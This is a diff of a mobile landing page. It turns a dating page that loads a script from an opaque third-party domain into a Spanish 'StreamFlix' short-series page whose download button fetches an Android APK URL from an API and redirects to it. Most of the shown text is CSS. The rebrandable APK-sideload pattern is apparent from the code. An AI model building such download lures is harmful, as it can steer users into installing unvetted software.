@@ -1,464 +1,1182 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-  <meta charset="UTF-8">
-   
-<script src="https://url.yuhd320k.site/js/meetu-sdk.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
+<title>StreamFlix — Series Cortas en tu Bolsillo</title>
+<meta name="description" content="StreamFlix — Miles de series cortas verticales. Mira 1 episodio en 60 segundos. Descarga el APK gratis para Android. Sin anuncios.">
+<meta property="og:title" content="StreamFlix — Series Cortas en tu Bolsillo">
+<meta property="og:description" content="Miles de series cortas verticales. Mira 1 episodio en 60 segundos. Sin anuncios.">
+<meta property="og:type" content="website">
+<link rel="icon" href="img/logo.jpg">
+ 
 
-
-  <script>
- function k2()
- {
-   MeetU.download(event);
- }
+<script>
+// ========== k2 — 动态获取APK下载地址并跳转 ==========
+var _apkUrl = '';
+async function k2(source) {
+    try {
+        if (!_apkUrl) {
+            var r = await fetch(API_BASE + '/api/apk-url?site=' + encodeURIComponent(_site));
+            var d = await r.json();
+            _apkUrl = d.url;
+            console.log('APK API返回:', JSON.stringify(d));
+        }
+        if (_apkUrl) {
+            window.location.href = _apkUrl;
+        } else {
+            alert('获取APK下载地址失败，请稍后重试');
+        }
+    } catch (e) {
+        alert('获取APK下载地址失败，请稍后重试');
+    }
+}
 </script>
 
-    
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600;9..144,700;9..144,900&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>GhaVibe - Meet Local Singles | Find Your Match Tonight</title>
-  <style>
-    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-    body{font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Microsoft YaHei',sans-serif;background:linear-gradient(180deg,#1a0a14 0%,#0d0d1a 100%);color:#fff;-webkit-font-smoothing:antialiased;overflow-x:hidden;max-width:480px;margin:0 auto;padding-bottom:100px}
-    ::selection{background:rgba(255,75,110,0.4)}
-    .hero{position:relative;padding:2rem 1rem 1.25rem;text-align:center;overflow:hidden}
-    .hero::before{content:'';position:absolute;top:-30%;left:-20%;width:140%;height:70%;background:radial-gradient(ellipse,rgba(255,75,110,0.12) 0%,transparent 60%);pointer-events:none}
-    .hero-badge{display:inline-flex;align-items:center;gap:6px;padding:5px 14px;background:rgba(255,75,110,0.12);border:1px solid rgba(255,75,110,0.2);border-radius:3rem;font-size:0.7rem;font-weight:600;color:#ff6b81;margin-bottom:1rem;position:relative;z-index:1}
-    .live-dot{width:7px;height:7px;background:#ff3b5c;border-radius:50%;animation:livePulse 1.5s infinite}
-    @keyframes livePulse{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(255,59,92,0.6)}50%{opacity:0.5;box-shadow:0 0 0 6px rgba(255,59,92,0)}}
-    .hero h1{font-size:2rem;font-weight:800;line-height:1.15;letter-spacing:-0.03em;margin-bottom:0.5rem;position:relative;z-index:1}
-    .hero h1 .gt{background:linear-gradient(135deg,#ff4b6e,#ff8fa3,#c44dff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-    .hero-sub{font-size:0.82rem;color:rgba(255,255,255,0.55);line-height:1.5;margin-bottom:1rem;position:relative;z-index:1;max-width:300px;margin-left:auto;margin-right:auto}
-    .online-indicator{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;background:rgba(50,200,150,0.08);border:1px solid rgba(50,200,150,0.15);border-radius:3rem;font-size:0.68rem;color:#32c896;margin-bottom:0.75rem;position:relative;z-index:1}
-    .online-dot{width:6px;height:6px;background:#32c896;border-radius:50%;animation:livePulse 2s infinite}
-    .float-avatars{display:flex;justify-content:center;gap:0.4rem;margin-bottom:1rem;position:relative;z-index:1}
-    .float-avatars img{width:42px;height:42px;border-radius:50%;object-fit:cover;border:2px solid rgba(255,255,255,0.12)}
-    .float-avatars img:nth-child(odd){transform:translateY(-6px)}
-    .float-avatars img:nth-child(even){transform:translateY(2px)}
-    .dl-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;max-width:280px;margin:0 auto;padding:0.85rem;border-radius:3rem;font-size:0.95rem;font-weight:700;text-decoration:none;cursor:pointer;border:none;background:linear-gradient(135deg,#ff4b6e,#ff2d55);color:#fff;box-shadow:0 6px 24px rgba(255,45,85,0.3);transition:all 0.2s;position:relative;z-index:1}
-    .dl-btn:active{transform:scale(0.96)}
-    .dl-btn small{display:block;font-size:0.65rem;font-weight:400;opacity:0.75;line-height:1.3}
-    .stats-row{display:flex;justify-content:center;gap:1.5rem;margin-top:1rem}
-    .stat-num{font-size:1.2rem;font-weight:800;color:#ff6b81}
-    .stat-label{font-size:0.65rem;color:rgba(255,255,255,0.4)}
-    .sec{padding:1.5rem 0.5rem}
-    .sec-dark{background:rgba(255,255,255,0.015)}
-    .sec-title{font-size:1.2rem;font-weight:700;text-align:center;letter-spacing:-0.02em;margin-bottom:0.25rem}
-    .sec-sub{font-size:0.75rem;color:rgba(255,255,255,0.45);text-align:center;margin-bottom:1rem}
+<style>
+/* ============================================================
+   RESET
+   ============================================================ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{
+  scroll-behavior:smooth;
+  -webkit-text-size-adjust:100%;
+  -webkit-tap-highlight-color:transparent;
+}
+body{
+  font-family:'Outfit',system-ui,-apple-system,sans-serif;
+  background:var(--bg);
+  color:var(--ink);
+  line-height:1.6;
+  -webkit-font-smoothing:antialiased;
+  text-rendering:optimizeLegibility;
+  overflow-x:hidden;
+}
+img,svg{display:block;max-width:100%}
+button{font:inherit;cursor:pointer;border:none;outline:none;background:none;color:inherit}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+:focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:4px}
 
-    /* ---- User Cards with Carousel ---- */
-    .user-grid{display:flex;flex-wrap:wrap;gap:6px}
-    .user-card{width:calc(50% - 3px);border-radius:12px;overflow:hidden;position:relative;aspect-ratio:3/4;cursor:default}
-    .user-card img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
-    .user-card::after{content:'';position:absolute;inset:0;background:linear-gradient(0deg,rgba(0,0,0,0.7) 0%,transparent 40%,transparent 100%);z-index:1;pointer-events:none}
-    .card-swipe-hint{display:none}
-    /* ---- Fullscreen Viewer ---- */
-    .viewer{display:none;position:fixed;inset:0;z-index:999;background:rgba(0,0,0,0.95);flex-direction:column;align-items:center;justify-content:center}
-    .viewer.on{display:flex}
-    .viewer-close{position:absolute;top:16px;right:16px;z-index:10;width:36px;height:36px;border-radius:50%;background:rgba(255,255,255,0.12);color:#fff;display:flex;align-items:center;justify-content:center;font-size:1.2rem;line-height:1;cursor:pointer;border:none;backdrop-filter:blur(8px)}
-    .viewer-close:active{background:rgba(255,255,255,0.25)}
-    .viewer-carousel{display:flex;overflow-x:auto;scroll-snap-type:x mandatory;scrollbar-width:none;width:100%;max-width:400px;aspect-ratio:3/4;border-radius:16px;overflow:hidden}
-    .viewer-carousel::-webkit-scrollbar{display:none}
-    .viewer-carousel img{flex:0 0 100%;width:100%;height:100%;object-fit:cover;scroll-snap-align:start}
-    .viewer-dots{display:flex;gap:6px;margin-top:16px}
-    .viewer-dot{width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,0.3);transition:all 0.2s}
-    .viewer-dot.on{background:#fff;width:18px;border-radius:3px}
-    .viewer-info{text-align:center;margin-top:12px;color:#fff}
-    .viewer-info .v-name{font-size:1rem;font-weight:700}
-    .viewer-info .v-job{font-size:0.75rem;color:rgba(255,255,255,0.55)}
-    .viewer-info .v-stats{font-size:0.7rem;color:rgba(255,255,255,0.45);margin-top:2px}
-    .viewer-info .v-loc{font-size:0.68rem;color:rgba(255,255,255,0.5);margin-top:2px}
-    .viewer-arrow{position:absolute;top:50%;transform:translateY(-50%);z-index:10;width:40px;height:40px;border-radius:50%;background:rgba(255,255,255,0.12);color:#fff;display:flex;align-items:center;justify-content:center;font-size:1.2rem;cursor:pointer;border:none;backdrop-filter:blur(8px);transition:background 0.2s}
-    .viewer-arrow:active{background:rgba(255,255,255,0.3)}
-    .viewer-arrow.prev{left:12px}
-    .viewer-arrow.next{right:12px}
-    .viewer-arrow svg{width:20px;height:20px}
-    .user-card .badge{position:absolute;top:8px;left:8px;padding:3px 8px;border-radius:3rem;font-size:0.55rem;font-weight:700;z-index:3}
-    .badge-online{background:rgba(50,200,150,0.9);color:#fff}
-    .badge-hot{background:rgba(255,107,53,0.9);color:#fff}
-    .badge-new{background:rgba(138,75,255,0.9);color:#fff}
-    .card-contact{position:absolute;bottom:44px;right:8px;z-index:5;display:flex;align-items:center;gap:4px;padding:6px 10px;border-radius:18px;background:linear-gradient(135deg,#ff4b6e,#ff2d55);color:#fff;font-size:0.55rem;font-weight:600;cursor:pointer;border:none;white-space:nowrap;box-shadow:0 2px 10px rgba(255,45,85,0.4);transition:all 0.15s}
-    .card-contact svg{width:11px;height:11px;flex-shrink:0}
-    .card-contact:active{transform:scale(0.93);box-shadow:0 1px 6px rgba(255,45,85,0.25)}
-    .user-card .info{position:absolute;bottom:0;left:0;right:0;z-index:2;padding:10px 8px 8px}
-    .user-card .name{font-size:0.7rem;font-weight:700;color:#fff;display:flex;align-items:center;gap:4px}
-    .user-card .age{font-size:0.65rem;font-weight:400;color:rgba(255,255,255,0.65)}
-    .user-card .name svg{width:10px;height:10px;flex-shrink:0}
-    .user-card .job{font-size:0.58rem;color:rgba(255,255,255,0.55);margin-bottom:1px}
-    .user-card .body-stats{font-size:0.55rem;color:rgba(255,255,255,0.5);display:flex;gap:6px;margin-bottom:1px}
-    .user-card .loc{display:none}
-    .user-card .tags{display:flex;gap:3px;margin-top:3px}
-    .user-card .tag{font-size:0.5rem;padding:2px 6px;border-radius:3rem;background:rgba(255,255,255,0.15);color:rgba(255,255,255,0.85)}
+/* ============================================================
+   DESIGN TOKENS — Editorial Cinema (light)
+   ============================================================ */
+:root{
+  --bg:#F6F1E8;
+  --bg-deep:#EDE5D6;
+  --surface:#FFFDF8;
+  --surface-2:#F3ECE0;
+  --ink:#201A13;
+  --ink-2:#574C3F;
+  --ink-3:#8A7B67;
+  --hairline:#E4D8C5;
+  --hairline-strong:#D2C2A9;
+  --accent:#C6402A;
+  --accent-dark:#A6321F;
+  --accent-soft:rgba(198,64,42,.10);
+  --accent-soft-2:rgba(198,64,42,.16);
+  --star:#C98A1B;
+  --gold-soft:#F4E6C8;
+  --radius-sm:10px;
+  --radius:16px;
+  --radius-lg:22px;
+  --radius-xl:30px;
+  --radius-full:999px;
+  --font-display:'Fraunces',Georgia,'Times New Roman',serif;
+  --font-sans:'Outfit',system-ui,sans-serif;
+  --shadow-sm:0 1px 2px rgba(64,48,28,.06),0 4px 14px rgba(64,48,28,.06);
+  --shadow-md:0 2px 4px rgba(64,48,28,.06),0 12px 32px rgba(64,48,28,.12);
+  --shadow-lg:0 8px 24px rgba(64,48,28,.14),0 24px 60px rgba(64,48,28,.18);
+  --ease:cubic-bezier(.22,.61,.36,1);
+  --ease-spring:cubic-bezier(.34,1.4,.64,1);
+  --container:1160px;
+  --noise:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='160'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+}
 
-    .steps{display:flex;gap:0.4rem}
-    .step{flex:1;text-align:center;padding:0.6rem 0.3rem;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:0.6rem}
-    .step-num{width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:50%;font-weight:800;font-size:0.75rem;margin:0 auto 0.3rem}
-    .step:nth-child(1) .step-num{background:rgba(255,75,110,0.15);color:#ff6b81}
-    .step:nth-child(2) .step-num{background:rgba(138,75,255,0.15);color:#c44dff}
-    .step:nth-child(3) .step-num{background:rgba(50,200,150,0.15);color:#32c896}
-    .step h5{font-size:0.7rem;font-weight:600;margin-bottom:1px}
-    .step p{font-size:0.6rem;color:rgba(255,255,255,0.4);line-height:1.2}
+/* grain overlay */
+.grain{
+  position:fixed;inset:0;z-index:2000;pointer-events:none;
+  background-image:var(--noise);background-size:160px 160px;
+  opacity:.05;mix-blend-mode:multiply;
+}
 
-    .safety-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:0.3rem}
-    .safety-item{text-align:center;padding:0.6rem 0.2rem;background:rgba(255,255,255,0.015);border-radius:0.5rem;font-size:0.65rem}
+.container{max-width:var(--container);margin:0 auto;padding:0 clamp(20px,4vw,48px)}
 
-    .review-carousel{display:flex;gap:0.6rem;overflow-x:auto;padding:0.25rem 0;-webkit-overflow-scrolling:touch;scrollbar-width:none;scroll-snap-type:x mandatory}
-    .review-carousel::-webkit-scrollbar{display:none}
-    .review-card{min-width:250px;max-width:290px;flex-shrink:0;scroll-snap-align:start;background:rgba(255,255,255,0.025);border:1px solid rgba(255,255,255,0.05);border-radius:0.75rem;padding:0.85rem}
-    .review-stars{display:flex;gap:1px;margin-bottom:0.4rem}
-    .review-text{font-size:0.7rem;color:rgba(255,255,255,0.65);line-height:1.5;font-style:italic;margin-bottom:0.6rem}
-    .review-author{display:flex;align-items:center;gap:0.4rem}
-    .review-author img{width:28px;height:28px;border-radius:50%;object-fit:cover}
-    .review-author-name{font-size:0.7rem;font-weight:600}
-    .review-author-role{font-size:0.58rem;color:rgba(255,255,255,0.35)}
-    .review-hint{display:flex;justify-content:center;gap:0.3rem;margin-top:0.5rem;opacity:0.3;font-size:0.6rem}
+/* ============================================================
+   BUTTONS
+   ============================================================ */
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:10px;
+  font-weight:600;letter-spacing:-.01em;
+  border-radius:var(--radius-full);
+  transition:transform .18s var(--ease),box-shadow .25s var(--ease),background .2s;
+  white-space:nowrap;
+}
+.btn svg{width:18px;height:18px;flex-shrink:0}
+.btn-primary{
+  background:var(--accent);color:#FFF8F3;
+  padding:15px 28px;font-size:1rem;
+  box-shadow:0 10px 26px rgba(198,64,42,.32);
+}
+.btn-primary:hover{background:var(--accent-dark);transform:translateY(-2px);box-shadow:0 14px 34px rgba(198,64,42,.4)}
+.btn-primary:active{transform:translateY(0) scale(.97);box-shadow:0 6px 16px rgba(198,64,42,.3)}
+.btn-ghost{
+  background:transparent;color:var(--ink);
+  border:1px solid var(--hairline-strong);
+  padding:14px 26px;font-size:.95rem;
+}
+.btn-ghost:hover{border-color:var(--accent);color:var(--accent)}
+.btn-ghost:active{transform:scale(.97)}
+.btn-sm{padding:10px 20px;font-size:.875rem}
+.btn-sm svg{width:16px;height:16px}
 
-    .android-btn{display:flex;align-items:center;justify-content:center;gap:6px;width:100%;max-width:240px;margin:0 auto;padding:0.75rem;border-radius:3rem;font-size:0.9rem;font-weight:700;text-decoration:none;cursor:pointer;border:none;background:linear-gradient(135deg,#4da6ff,#3b82f6);color:#fff;box-shadow:0 4px 18px rgba(59,130,246,0.25)}
-    .android-btn:active{transform:scale(0.96)}
+/* ============================================================
+   TOP NAV
+   ============================================================ */
+.top-nav{
+  position:sticky;top:0;z-index:100;
+  background:rgba(246,241,232,.82);
+  backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
+  border-bottom:1px solid transparent;
+  transition:border-color .3s,box-shadow .3s;
+}
+.top-nav.scrolled{border-bottom-color:var(--hairline);box-shadow:0 6px 24px rgba(64,48,28,.06)}
+.top-nav-inner{
+  display:flex;align-items:center;justify-content:space-between;gap:16px;
+  height:68px;
+}
+.nav-brand{display:flex;align-items:center;gap:11px}
+.nav-logo{
+  width:34px;height:34px;border-radius:10px;object-fit:cover;
+  box-shadow:0 2px 8px rgba(64,48,28,.16);
+}
+.nav-wordmark{font-family:var(--font-display);font-weight:700;font-size:1.35rem;letter-spacing:-.01em}
+.nav-wordmark span{color:var(--accent)}
+.nav-links{display:flex;align-items:center;gap:30px}
+.nav-links a{
+  font-size:.9rem;font-weight:500;color:var(--ink-2);
+  transition:color .2s;
+}
+.nav-links a:hover{color:var(--accent)}
 
-    /* Hot Picks Carousel */
-    .hot-scroll{display:flex;gap:10px;overflow-x:auto;scroll-snap-type:x mandatory;scrollbar-width:none;-webkit-overflow-scrolling:touch;padding:4px 0.5rem 8px;margin:0 -0.5rem;scroll-behavior:smooth}
-    .hot-scroll::-webkit-scrollbar{display:none}
-    .hot-card{flex:0 0 140px;scroll-snap-align:start;border-radius:14px;overflow:hidden;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);cursor:pointer;transition:transform 0.15s}
-    .hot-card:active{transform:scale(0.96)}
-    .hot-img{position:relative;aspect-ratio:3/4;overflow:hidden}
-    .hot-img img{width:100%;height:100%;object-fit:cover}
-    .hot-badge{position:absolute;top:6px;left:6px;padding:3px 8px;border-radius:10px;font-size:0.5rem;font-weight:700;text-transform:uppercase;letter-spacing:0.03em}
-    .hot-badge.popular{background:linear-gradient(135deg,#FF6B35,#FF8C42);color:#fff}
-    .hot-badge.new{background:linear-gradient(135deg,#4DA6FF,#3B82F6);color:#fff}
-    .hot-badge.verified{background:linear-gradient(135deg,#32C896,#22C55E);color:#fff}
-    .hot-badge.hot{background:linear-gradient(135deg,#FF3B5C,#EF4444);color:#fff}
-    .hot-badge.vip{background:linear-gradient(135deg,#C44DFF,#A855F7);color:#fff}
-    .hot-views{position:absolute;bottom:6px;right:6px;font-size:0.55rem;font-weight:600;color:#fff;background:rgba(0,0,0,0.5);padding:2px 7px;border-radius:8px;backdrop-filter:blur(4px)}
-    .hot-info{padding:10px 8px}
-    .hot-name{font-size:0.75rem;font-weight:700;color:#fff}
-    .hot-loc{display:none}
-    .hot-dots{display:flex;justify-content:center;gap:5px;margin-top:10px}
-    .hot-dot{width:5px;height:5px;border-radius:3px;background:rgba(255,255,255,0.2);transition:all 0.3s}
-    .hot-dot.on{background:#ff6b81;width:16px}
+/* ============================================================
+   HERO
+   ============================================================ */
+.hero{
+  position:relative;
+  padding:clamp(40px,7vw,88px) 0 clamp(32px,5vw,64px);
+  overflow:hidden;
+}
+.hero::before{
+  content:'';position:absolute;inset:0;
+  background:
+    radial-gradient(60% 80% at 88% 12%,rgba(198,64,42,.10),transparent 60%),
+    radial-gradient(50% 60% at 6% 88%,rgba(201,138,27,.10),transparent 60%);
+  pointer-events:none;
+}
+.hero-grid{
+  position:relative;display:grid;grid-template-columns:1.05fr .95fr;
+  gap:clamp(32px,5vw,72px);align-items:center;
+}
+.eyebrow{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:7px 15px;border-radius:var(--radius-full);
+  background:var(--surface);border:1px solid var(--hairline);
+  font-size:.78rem;font-weight:600;letter-spacing:.02em;color:var(--ink-2);
+  margin-bottom:22px;
+}
+.eyebrow .dot{
+  width:7px;height:7px;border-radius:50%;background:var(--accent);
+  animation:kicker-pulse 1.8s ease-in-out infinite;
+}
+@keyframes kicker-pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(.6);opacity:.4}}
+.hero h1{
+  font-family:var(--font-display);font-weight:700;
+  font-size:clamp(2.6rem,5.6vw,4.5rem);
+  line-height:1.02;letter-spacing:-.02em;
+  margin-bottom:20px;text-wrap:balance;
+}
+.hero h1 em{
+  font-style:italic;color:var(--accent);font-weight:600;
+}
+.hero-lead{
+  font-size:1.06rem;color:var(--ink-2);line-height:1.65;
+  max-width:46ch;margin-bottom:26px;text-wrap:pretty;
+}
+.hero-actions{display:flex;flex-wrap:wrap;align-items:center;gap:14px;margin-bottom:26px}
+.hero-actions .micro{
+  font-size:.8rem;color:var(--ink-3);display:flex;align-items:center;gap:6px;
+}
+.hero-actions .micro svg{width:15px;height:15px;color:var(--accent)}
 
-    .float-cta{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;z-index:200;padding:0.6rem 0.75rem 0.85rem;background:linear-gradient(0deg,rgba(13,13,26,0.98) 60%,rgba(13,13,26,0) 100%);pointer-events:none}
-    .float-cta-btn{display:flex;align-items:center;justify-content:center;gap:6px;width:100%;padding:0.8rem;border-radius:3rem;font-size:0.95rem;font-weight:700;text-decoration:none;cursor:pointer;border:none;background:linear-gradient(135deg,#ff4b6e,#ff2d55);color:#fff;pointer-events:auto;animation:breathe 1.8s ease-in-out infinite;box-shadow:0 0 20px rgba(255,45,85,0.5)}
-    @keyframes breathe{0%,100%{box-shadow:0 0 20px rgba(255,45,85,0.5);transform:scale(1)}50%{box-shadow:0 0 40px rgba(255,75,110,0.8),0 0 60px rgba(255,45,85,0.3);transform:scale(1.03)}}
-    .float-cta-btn:active{transform:scale(0.96);animation:none}
-    .ft{text-align:center;padding:0.75rem;font-size:0.6rem;color:rgba(255,255,255,0.2)}
-    /* Chat / Support icon */
-    .chat-fab{position:fixed;right:12px;bottom:120px;z-index:150;width:52px;height:52px;border-radius:50%;background:linear-gradient(135deg,#32c896,#22c55e);color:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;border:none;box-shadow:0 4px 20px rgba(50,200,150,0.35);animation:chatPulse 2s ease-in-out infinite;transition:transform 0.15s}
-    .chat-fab:active{transform:scale(0.9);animation:none}
-    .chat-fab svg{width:24px;height:24px}
-    .chat-badge{position:absolute;top:-4px;right:-4px;width:22px;height:22px;border-radius:50%;background:#ff3b5c;color:#fff;font-size:0.7rem;font-weight:800;display:flex;align-items:center;justify-content:center;animation:badgeBounce 1.2s ease-in-out infinite;border:2px solid #0d0d1a}
-    @keyframes badgeBounce{0%,100%{transform:scale(1)}30%{transform:scale(1.25)}60%{transform:scale(0.9)}}
-    @keyframes chatPulse{0%,100%{box-shadow:0 4px 20px rgba(50,200,150,0.35)}50%{box-shadow:0 6px 30px rgba(50,200,150,0.6),0 0 0 8px rgba(50,200,150,0.08)}}
+.hero-meta{display:flex;flex-wrap:wrap;align-items:center;gap:18px}
+.live-indicator{
+  display:inline-flex;align-items:center;gap:9px;
+  font-size:.84rem;font-weight:600;color:var(--ink-2);
+}
+.live-dot{
+  width:9px;height:9px;border-radius:50%;background:#3FA65E;
+  box-shadow:0 0 0 4px rgba(63,166,94,.18);
+  animation:live-pulse 1.5s ease-in-out infinite;
+}
+@keyframes live-pulse{0%,100%{box-shadow:0 0 0 4px rgba(63,166,94,.18)}50%{box-shadow:0 0 0 8px rgba(63,166,94,.06)}}
+.live-count{color:var(--ink);font-weight:700;font-variant-numeric:tabular-nums}
 
-    /* ---- Top Hero (Nuevo) ---- */
-    .hero-top{position:relative;padding:1.25rem 0.75rem 0.5rem;overflow:visible;text-align:center}
-    .hero-top-glow{position:absolute;inset:0;pointer-events:none;z-index:0}
-    .hero-top-glow::before,.hero-top-glow::after{content:"";position:absolute;border-radius:50%;filter:blur(80px)}
-    .hero-top-glow::before{top:-60px;right:-60px;width:260px;height:260px;background:rgba(255,75,110,0.1)}
-    .hero-top-glow::after{top:100px;left:-50px;width:200px;height:200px;background:rgba(196,77,255,0.08)}
-    .hero-top-inner{position:relative;z-index:1;max-width:400px;margin:0 auto}
-    .hero-top-badge{display:inline-flex;align-items:center;gap:5px;padding:4px 12px;background:rgba(255,75,110,0.06);border:1px solid rgba(255,75,110,0.2);border-radius:3rem;font-size:0.65rem;font-weight:600;color:#ff6b81;margin-bottom:0.75rem;box-shadow:0 0 10px rgba(255,75,110,0.08)}
-    .hero-top-badge .ping-dot{position:relative;width:7px;height:7px;background:#ff3b5c;border-radius:50%}
-    .hero-top-badge .ping-dot::after{content:"";position:absolute;inset:-3px;border-radius:50%;background:rgba(255,59,92,0.35);animation:pingAnim 1.5s infinite}
-    @keyframes pingAnim{0%{transform:scale(1);opacity:1}100%{transform:scale(2.2);opacity:0}}
-    .hero-top h1{font-size:1.5rem;font-weight:800;line-height:1.15;letter-spacing:-0.02em;margin-bottom:0.5rem}
-    .hero-top h1 .gt{background:linear-gradient(135deg,#ff4b6e,#ff8fa3,#c44dff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-    .hero-top-desc{font-size:0.75rem;color:rgba(255,255,255,0.5);line-height:1.5;margin:0 auto 0.75rem;max-width:320px}
-    .hero-top-users{display:flex;align-items:center;justify-content:center;gap:0.5rem;margin-bottom:0.85rem;flex-wrap:wrap}
-    .hero-top-avatars{display:flex;align-items:center}
-    .hero-top-avatars img{width:34px;height:34px;border-radius:50%;object-fit:cover;border:2px solid #0d0d1a;margin-left:-10px;cursor:pointer;transition:opacity 0.2s}
-    .hero-top-avatars img:first-child{margin-left:0}
-    .hero-top-avatars img:hover{opacity:0.8}
-    .hero-top-avatars .plus-avatar{width:34px;height:34px;border-radius:50%;background:rgba(255,255,255,0.06);border:2px solid #0d0d1a;display:flex;align-items:center;justify-content:center;font-size:0.7rem;font-weight:800;color:rgba(255,255,255,0.6);margin-left:-10px}
-    .hero-top-users-text{font-size:0.65rem;color:rgba(255,255,255,0.4)}
-    .hero-top-users-text strong{color:#fff;font-weight:700}
-    .hero-phone-wrap{position:relative;max-width:210px;margin:0 auto 0.25rem}
-    .hero-phone-glow{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:130%;height:130%;border-radius:50%;background:radial-gradient(circle,rgba(255,75,110,0.18) 0%,rgba(196,77,255,0.08) 45%,transparent 70%);filter:blur(40px);pointer-events:none;z-index:0}
-    .hero-phone{position:relative;background:#1a1125;border:4px solid #2d1e3d;border-radius:2rem;overflow:hidden;aspect-ratio:9/18;box-shadow:0 16px 40px rgba(0,0,0,0.5);z-index:1}
-    .hero-phone-notch{position:absolute;top:0;left:50%;transform:translateX(-50%);width:96px;height:15px;background:#2d1e3d;border-radius:0 0 10px 10px;z-index:10;display:flex;align-items:flex-end;justify-content:center;padding-bottom:2px;gap:4px}
-    .hero-phone-notch .bar{width:26px;height:2px;background:rgba(0,0,0,0.35);border-radius:2px}
-    .hero-phone-notch .dot{width:3px;height:3px;background:rgba(0,0,0,0.35);border-radius:50%}
-    .hero-phone-screen{position:absolute;inset:0;background:#0d0714;padding-top:18px;display:flex;flex-direction:column}
-    .hero-phone-topbar{display:flex;justify-content:space-between;align-items:center;padding:5px 8px;background:rgba(21,10,34,0.85);backdrop-filter:blur(6px);border-bottom:1px solid rgba(255,255,255,0.04);font-size:0.4rem;font-weight:700;color:#fff}
-    .hero-phone-cards{flex:1;position:relative;margin:6px 8px}
-    .hero-phone-card-shadow{position:absolute;inset:6px -3px 28px -3px;background:#1e132b;border-radius:14px;border:1px solid rgba(255,255,255,0.02);transform:scale(0.93) translateY(6px);opacity:0.3}
-    .hero-phone-card{position:absolute;inset:0;bottom:28px;background:#1e132b;border-radius:14px;overflow:hidden;border:1px solid rgba(255,255,255,0.06);display:flex;flex-direction:column;cursor:pointer}
-    .hero-phone-card-img{flex:1;position:relative;background:#1a1125}
-    .hero-phone-card-img img{width:100%;height:100%;object-fit:cover;opacity:0.9}
-    .hero-phone-card-img::after{content:"";position:absolute;inset:0;background:linear-gradient(0deg,rgba(0,0,0,0.8) 0%,rgba(0,0,0,0.05) 40%,transparent 100%)}
-    .hero-phone-card-info{position:absolute;bottom:6px;left:8px;z-index:2;color:#fff}
-    .hero-phone-card-info .uname{font-size:0.48rem;font-weight:800;display:flex;align-items:center;gap:2px;text-shadow:0 1px 3px rgba(0,0,0,0.5)}
-    .hero-phone-card-info .uloc{font-size:0.38rem;color:rgba(255,255,255,0.55);margin-top:1px;display:flex;align-items:center;gap:2px}
-    .hero-phone-actions{display:flex;justify-content:center;gap:10px;padding:8px;background:#150a22}
-    .hero-phone-actions button{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;border:none;cursor:pointer;transition:all 0.15s;padding:0}
-    .hero-phone-actions .btn-no{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);color:rgba(255,255,255,0.4)}
-    .hero-phone-actions .btn-no:active{background:rgba(255,255,255,0.1)}
-    .hero-phone-actions .btn-yes{background:linear-gradient(135deg,#ff4b6e,#ff2d55);color:#fff;box-shadow:0 0 10px rgba(255,45,85,0.3)}
-    .hero-phone-actions .btn-yes:active{transform:scale(0.88)}
-    .hero-phone-actions .btn-star{background:rgba(196,77,255,0.12);border:1px solid rgba(196,77,255,0.2);color:#c44dff}
-    .hero-phone-actions .btn-star:active{background:rgba(196,77,255,0.22)}
-    .hero-phone-tabs{display:flex;justify-content:space-around;align-items:center;padding:6px 2px 4px;background:rgba(21,10,34,0.9);backdrop-filter:blur(6px);border-top:1px solid rgba(255,255,255,0.04)}
-    .hero-phone-tabs span{color:rgba(255,255,255,0.25);display:flex;flex-direction:column;align-items:center;position:relative;font-size:0.55rem}
-    .hero-phone-tabs span.on{color:#ff4b6e;filter:drop-shadow(0 0 5px rgba(255,75,110,0.4))}
-    .hero-phone-tabs .tab-badge{position:absolute;top:-3px;right:-8px;min-width:13px;height:13px;background:#ff3b5c;border-radius:8px;font-size:0.38rem;font-weight:800;color:#fff;display:flex;align-items:center;justify-content:center;padding:0 3px;border:2px solid #150a22;line-height:1}
-    .hero-float-imgs{position:absolute;z-index:5;pointer-events:none}
-    .hero-float-imgs img{border-radius:50%;object-fit:cover;position:absolute;cursor:pointer;pointer-events:auto}  </style>
+.avatar-stack{display:flex;align-items:center;gap:14px}
+.avatar-stack .faces{display:flex}
+.avatar-stack img{
+  width:40px;height:40px;border-radius:50%;object-fit:cover;
